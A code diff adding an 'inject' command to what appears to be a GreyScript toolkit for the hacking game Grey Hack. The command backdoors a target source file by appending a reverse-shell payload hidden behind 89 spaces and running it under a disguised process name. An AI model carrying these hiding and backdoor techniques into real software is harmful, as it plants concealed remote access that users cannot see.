@@ -1,0 +1,53 @@
+// =============================================================================
+// INJECT
+// Embed a reverse-shell backdoor into a target GreyScript source file.
+// =============================================================================
+Command.inject=function(Obj,argv)
+  if not argv then return Man.help(["inject"])
+  _p=ArgumentParser.init
+  _p.addArgument("i",false,"store")        // IP address
+  _p.addArgument("p",false,"storeNumber")  // Port number
+  _p.addArgument("n",false,"store")        // Process name
+  argv=_p.parse("inject",argv,Obj)
+  if argv isa Error then return
+  if not argv.rest then return Error.set("No file specified for injection")
+  targetFile=Io._getFile(Obj,argv.rest[0])
+  if targetFile isa Error then return
+  if Io.isBinFolder(targetFile) then return Error.set("Invalid file type")
+  if hasIndex(argv,"useAI") then
+    // AI mode: interactive GUI prompts with intelligent defaults
+    argv.i=System.rshell
+    if not argv.i then argv.i=Gui.inputIP({"text":"What rshell server ip would you like to use?"})
+    if argv.i==null then return Error.set("Unable to determine rshell public ip")
+    argv.p=Gui.inputInt({"text":"What port would you like to use?","default":1222})
+    if not argv.p isa number then return Error.set("Unable to determine rshell port")
+    argv.n=Gui.input({"text":"What will be the name of the rshell process?","default":"ps"})
+  else
+    if not argv.i then return Error.set("No rshell server ip specified")
+    if not argv.p then return Error.set("No rshell port specified")
+    if not argv.n then return Error.set("No rshell process name specified")
+  end if
+  // Build injection payload - compressed code with 89 space prefix for obfuscation
+  // Payload: search filesystem for metaxploit, check for existing process, spawn rshell if not found
+  payload=" "*89+";M=null;R=File(host_computer(get_shell),""/"");F=get_folders(R)+get_files(R);while len(F);C=pull(F);if is_folder(C) then F=F+get_folders(C)+get_files(C);M=include_lib(path(C));if typeof(M)==""MetaxploitLib"" then break;end while;S=0;Z=show_procs(host_computer(get_shell));for P in split(Z,char(10))[1:];P=split(P,"" "");if P[-1]=="""+argv.n+""" then S=1;end for;if not S then;if M then rshell_client(M,"""+argv.i+""",to_int("""+argv.p+"""),"""+argv.n+""");end if"
+  lines=split(get_content(targetFile),char(10))
+  Info.info("Injecting code into "+name(targetFile))
+  for line in lines
+    // Skip comment lines (any line containing //)
+    if indexOf(line,"//")!=null then continue
+    injectedLine=line+payload
+    lineIndex=__line_idx
+    remove(lines,lineIndex)
+    insert(lines,lineIndex,injectedLine)
+    Info.info("Code injected into line "+lineIndex)
+    break
+  end for
+  result=set_content(targetFile,join(lines,char(10)))
+  if result isa string then
+    Error.set(result)
+  else if result==0 then
+    Error.set("Return a 0: meaning invalid file/permissions")
+  else
+    Info.info("Finished injection")
+  end if
+end function
